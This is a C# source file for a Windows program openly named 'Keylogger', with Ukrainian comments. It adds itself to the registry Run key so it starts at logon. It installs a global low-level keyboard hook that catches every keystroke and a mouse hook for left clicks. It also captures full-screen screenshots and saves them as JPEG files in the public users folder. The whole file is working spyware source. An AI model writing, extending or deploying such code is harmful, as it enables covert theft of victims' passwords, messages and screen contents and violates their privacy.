using System;
using System.Collections;
using System.ComponentModel;
using System.IO;
using System.Windows;
using System.Windows.Media.Imaging;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows.Interop;
using System.Collections.Generic;
using System.Diagnostics;


namespace Keylogger
{

    #region AutoRun

    public class AutoRun
    {
        public static bool SetAutoRun(bool autorun, string path)
        {
            const string name = "Keylogger";
            string EXEpath = path;
            RegistryKey reg;

            //відкриваєм 
            reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");

            try
            {
                if (autorun)
                {
                    try
                    {
                        reg.SetValue(name, EXEpath);
                        //MessageBox.Show("AutoRun TRUE");
                        //MessageBox.Show(Environment.OSVersion.ToString());
                    }
                    catch (NullReferenceException ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
                else
                {
                    reg.DeleteValue(name);
                    //MessageBox.Show("AutoRun FALSE");
                }
                reg.Flush();//
                reg.Close();
                //
            }

            catch
            {
                return false;
            }

            return true;
        }

        public static string Path()
        {
            int majorVer = Environment.OSVersion.Version.Major;
            string path;
            //MessageBox.Show(Environment.OSVersion.Version.Minor.ToString());
            //Windows XP
            string str = Environment.SystemDirectory.Remove(3);

            //MessageBox.Show(str);
            if (majorVer < 6)
            {
                path = str + @"Documents and Settings\All Users\";
                return path;
            }
            else
            {
                path = str + @"Users\Public\";
                return path;
            }

        }

        //public static bool SetStealth;

    }

    #endregion

    #region Keylogger

    class globalKeyboardHook
    {
        #region Constant, Structure and Delegate Definitions

        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
        
        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        public bool _hookAll = false;
        public bool HookAllKeys
        {
            get
            {
                return _hookAll;
            }
            set
            {
                _hookAll = value;
            }
        }
        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105;
        #endregion

        #region Instance Variables

        public List<System.Windows.Forms.Keys> HookedKeys = new List<System.Windows.Forms.Keys>();

        IntPtr hhook = IntPtr.Zero;
        keyboardHookProc khp;
        #endregion

        #region Events

        public event System.Windows.Forms.KeyEventHandler KeyDown;

        public event System.Windows.Forms.KeyEventHandler KeyUp;
        #endregion

        #region Constructors and Destructors

        public globalKeyboardHook()
        {
            khp = new keyboardHookProc(hookProc);
            hook();
        }

        ~globalKeyboardHook()
        {
            unhook();
        }
        #endregion

        #region Public Methods

        public void hook()
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                hhook = SetWindowsHookEx(WH_KEYBOARD_LL, khp, GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        public void unhook()
        {
            UnhookWindowsHookEx(hhook);
        }

        public int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
        {
            if (code >= 0)
            {
                System.Windows.Forms.Keys key = (System.Windows.Forms.Keys)lParam.vkCode;
               
                if (_hookAll ? true : Enum.IsDefined(typeof(System.Windows.Forms.Keys), key))
                {
                    //
                    System.Windows.Forms.KeyEventArgs kea = new System.Windows.Forms.KeyEventArgs(key);
                    if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && (KeyDown != null))
                    {
                        KeyDown(this, kea);
                    }
                    
                    else if ((wParam == WM_KEYUP || wParam == WM_SYSKEYUP) && (KeyUp != null))
                    {
                        KeyUp(this, kea);
                    }
                    if (kea.Handled)
                        return 1;
                }
            }
            return CallNextHookEx(hhook, code, wParam, ref lParam);
        }

        #endregion

        #region DLL imports

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        /// <param name="hInstance">The hook handle that was returned from SetWindowsHookEx</param>
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);
        /// <param name="idHook">The hook id</param>
        /// <param name="nCode">The hook code</param>
        /// <param name="wParam">The wparam.</param>
        /// <param name="lParam">The lparam.</param>
        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);
        /// <param name="lpFileName">Name of the library</param>
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        #endregion
    }

    #endregion

    #region Mouse

    public static class MouseHook

    {
        public static event EventHandler MouseAction = delegate { };

        public static void Start()
        {
            _hookID = SetHook(_proc);


        }
        public static void stop()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private static LowLevelMouseProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static IntPtr SetHook(LowLevelMouseProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_MOUSE_LL, proc,
                  GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
          int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && MouseMessages.WM_LBUTTONDOWN == (MouseMessages)wParam)
            {
                MSLLHOOKSTRUCT hookStruct = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));
                MouseAction(null, new EventArgs());
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private const int WH_MOUSE_LL = 14;

        private enum MouseMessages
        {
            WM_LBUTTONDOWN = 0x0201,
            WM_LBUTTONUP = 0x0202,
            WM_MOUSEMOVE = 0x0200,
            WM_MOUSEWHEEL = 0x020A,
            WM_RBUTTONDOWN = 0x0204,
            WM_RBUTTONUP = 0x0205
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MSLLHOOKSTRUCT
        {
            public POINT pt;
            public uint mouseData;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
          LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
          IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


    }

    #endregion

    #region ScreenShot

    static class BMP
    {
        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool DeleteObject(IntPtr hObject);

        public static BitmapSource ToBitmapSource(this System.Drawing.Bitmap source)
        {
            var hBitmap = source.GetHbitmap();

            try
            {
                return System.Windows.Interop.Imaging.CreateBitmapSourceFromHBitmap(
                    hBitmap,
                    IntPtr.Zero,
                    Int32Rect.Empty,
                    BitmapSizeOptions.FromEmptyOptions());
            }
            catch (Win32Exception)
            {
                return null;
            }
            finally
            {
                //NativeMethods.DeleteObject(hBitmap);
            }
        }
    }

    public static class ScreenShot
    {
        
        static BitmapEncoder bitmapenc;
        static BitmapSource bitmapsource;
        static JpegBitmapEncoder jpeg;

        [System.Runtime.InteropServices.DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr onj);

        private static BitmapSource TakeScreen()
        {


            Bitmap bitmap;
            BitmapSource bitmapsource = null;

            bitmap = new Bitmap((int) SystemParameters.PrimaryScreenWidth, (int) SystemParameters.PrimaryScreenHeight,
               System.Drawing.Imaging.PixelFormat.Format32bppArgb);

            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            }
            IntPtr handle = IntPtr.Zero;
            try
            {
                handle = bitmap.GetHbitmap();
                bitmapsource = Imaging.CreateBitmapSourceFromHBitmap(handle, IntPtr.Zero, Int32Rect.Empty,
                    BitmapSizeOptions.FromEmptyOptions());

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }

            finally
            {
                DeleteObject(handle);
            }

            return bitmapsource;

        }

        public static void ScreenSave(string numscreen)
        {
            string path = AutoRun.Path() + numscreen + ".jpg";
           // string path = AutoRun.Path() +  "Key.rtf";

            bitmapsource = ScreenShot.TakeScreen();
            jpeg = new JpegBitmapEncoder();
            jpeg.Frames.Add(BitmapFrame.Create(bitmapsource));
            FileStream fs = null;

            try
            {
                fs = new FileStream(path,FileMode.Create, FileAccess.Write);
                jpeg.Save(fs);
            }

            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }

            finally
            {
                fs.Close();
            }
        }

    }

    #endregion

   
    public enum WindowsHotKey
    {
        Alt = 0x0001,
        Ctrl = 0x0002,
        Shift = 0x0004,
        V = 0x56,
        F12 = 0x7B,
        ESC = 0x1B,
        None = 0x0
    }

    


}